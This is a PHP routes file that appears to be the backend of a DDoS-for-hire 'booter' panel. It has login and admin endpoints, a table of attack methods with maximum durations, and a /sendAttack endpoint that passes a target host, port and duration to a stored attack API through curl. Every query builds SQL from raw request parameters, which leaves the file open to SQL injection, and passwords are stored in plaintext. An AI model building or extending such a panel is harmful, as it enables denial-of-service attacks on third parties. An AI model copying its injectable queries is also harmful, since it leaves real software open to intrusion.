<?php


use Helper\Functions;
use Route\Route;
use Session\Session;
use Database\DB;


Route::get("/", function($req) {
    return Functions::view("index");
});

Route::post("/login", function($req) {
    if(isset($req['params']['email']) && isset($req['params']['password'])){
        $login = $req['params']['email'];
        $pass = $req['params']['password'];
        $checker = DB::query("SELECT * from `users` WHERE `email` = '$login' AND `password` = '$pass'");
        if(count($checker) > 0){
            $ip = $_SERVER['REMOTE_ADDR'];
            $randomToken = bin2hex(random_bytes(32));
            DB::query("UPDATE `users` SET `token`='{$randomToken}', `ip`='{$ip}' WHERE `id`='{$checker[0]['id']}'");
            Functions::JSON([
                "status" => "success",
                'access' => $checker[0]['access'],
                'admin' => $checker[0]['admin'],
                "token" => $randomToken
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "error" => "Invalid login or password"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid fields"
        ]);
    }
});

Route::post("/logout", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token'");
        if(count($checker) > 0){
            DB::query("UPDATE `users` SET `token`='' WHERE `id`='{$checker[0]['id']}'");
            Functions::JSON([
                "status" => "success",
                "message" => "You have been logged out"
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "error" => "Invalid token"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/getuser", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $checker = DB::query("SELECT `access`, `admin` from `users` WHERE `token` = '$token'");
        if(count($checker) > 0){
            Functions::JSON([
                "status" => "success",
                "data" => [
                    "access" => $checker[0]['access'],
                    "admin" => $checker[0]['admin']
                ]
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "error" => "Invalid token"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/changepass", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $oldpass = $req['params']['oldpass'];
        $newpass = $req['params']['newpass'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `password` = '$oldpass'");
        if(count($checker) > 0){
            DB::query("UPDATE `users` SET `password`='{$newpass}' WHERE `id`='{$checker[0]['id']}'");
            Functions::JSON([
                "status" => "success",
                "message" => "Password has been changed"
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Wrong password!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/adduser", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $email = $req['params']['email'];
        $newpass = $req['params']['password'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            $checkIfUserExists = DB::query("SELECT * from `users` WHERE `email` = '$email'");
            if(count($checkIfUserExists) > 0){
                Functions::JSON([
                    "status" => "error",
                    "message" => "User already exists!"
                ]);
            } else {
                DB::query("INSERT INTO `users` (`email`, `password`) VALUES ('$email', '$newpass')");
                $allUsers = DB::query("SELECT * from `users`");
                Functions::JSON([
                    "status" => "success",
                    "message" => "User has been added",
                    "users" => $allUsers
                ]);
            }
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/getalldata", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            $allUsers = DB::query("SELECT * from `users`");
            $link = DB::query("SELECT * from `api`");
            Functions::JSON([
                "status" => "success",
                "data" => $allUsers,
                "link" => $link[0]['link']
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/changeapi", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $api = $req['params']['api'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            DB::query("UPDATE `api` SET `link`='{$api}' WHERE `id`='1'");
            Functions::JSON([
                "status" => "success",
                "message" => "API has been changed"
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/getmethods", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            $methods = DB::query("SELECT * from `methods`");
            Functions::JSON([
                "status" => "success",
                "methods" => $methods
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/addmethod", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $method = $req['params']['namemethod'];
        $apimethod = $req['params']['apimethod'];
        $time = $req['params']['time'];
        $category = $req['params']['category'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            DB::query("INSERT INTO `methods` (`displayMethod`, `sendMethod`, `maxTime`, `category`) VALUES ('$method', '$apimethod', '$time', '$category')");
            $methods = DB::query("SELECT * from `methods`");
            Functions::JSON([
                "status" => "success",
                "methods" => $methods
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/removemethod", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $methodid = $req['params']['methodid'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            DB::query("DELETE FROM `methods` WHERE `id` = '$methodid'");
            $methods = DB::query("SELECT * from `methods`");
            Functions::JSON([
                "status" => "success",
                "methods" => $methods
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/removeuser", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $userid = $req['params']['userid'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            DB::query("DELETE FROM `users` WHERE `id` = '$userid'");
            $users = DB::query("SELECT * from `users`");
            Functions::JSON([
                "status" => "success",
                "message" => "User has been removed",
                "users" => $users
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/getuserbyid", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $userid = $req['params']['userid'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            $user = DB::query("SELECT * from `users` WHERE `id` = '$userid'");
            Functions::JSON([
                "status" => "success",
                "message" => "User found!",
                "user" => $user[0]
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/edituser", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $userid = $req['params']['userid'];
        $access = $req['params']['access'];
        $admin = $req['params']['admin'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `admin` = '1'");
        if(count($checker) > 0){
            DB::query("UPDATE `users` SET `access` = $access, `admin` = $admin WHERE `id` = '$userid'");
            Functions::JSON([
                "status" => "success",
                "message" => "User edited!",
            ]);
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});

Route::post("/sendAttack", function($req) {
    if(isset($req['params']['token'])){
        $token = $req['params']['token'];
        $host = $req['params']['host'];
        $port = $req['params']['port'];
        $time = $req['params']['time'];
        $method = $req['params']['method'];
        $checker = DB::query("SELECT * from `users` WHERE `token` = '$token' AND `access` = '1'");
        if(count($checker) > 0){
            if(time() >= $checker[0]['canAttack']) {
                $apimethod = DB::query("SELECT * from `methods` WHERE `displayMethod` = '$method'");
                if(count($apimethod) > 0) {
                    if($time > $apimethod[0]['maxTime']) {
                        Functions::JSON([
                            "status" => "error",
                            "message" => "Time is too long! (Max time is " . $apimethod[0]['maxTime'] . " seconds)"
                        ]);
                    } else {
                        $newTime = time() + $time;
                        DB::query("UPDATE `users` SET `canAttack` = '$newTime' WHERE `id` = '{$checker[0]['id']}'");
                        function get_content($URL){
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_URL, $URL);
                            $data = curl_exec($ch);
                            curl_close($ch);
                            return $data;
                        }
                        $api = DB::query("SELECT * from `api` WHERE `id` = '1'")[0]['link'];
                        $api = str_replace("{method}", $apimethod[0]['sendMethod'], $api);
                        $api = str_replace("{host}", $host, $api);
                        $api = str_replace("{port}", $port, $api);
                        $api = str_replace("{time}", $time, $api);
                        $content = get_content($api);

                        Functions::JSON([
                            "status" => "success",
                            "message" => "Attack sent!",
                        ]);
                    }
                } else {
                    Functions::JSON([
                        "status" => "error",
                        "message" => "Invalid method"
                    ]);
                }
            } else {
                Functions::JSON([
                    "status" => "error",
                    "message" => "You can't attack yet! You must wait ". $checker[0]['canAttack'] - time() ." seconds"
                ]);
            }
        } else {
            Functions::JSON([
                "status" => "error",
                "message" => "Permission denied!"
            ]);
        }
    } else {
        Functions::JSON([
            "status" => "error",
            "error" => "Invalid token"
        ]);
    }
});
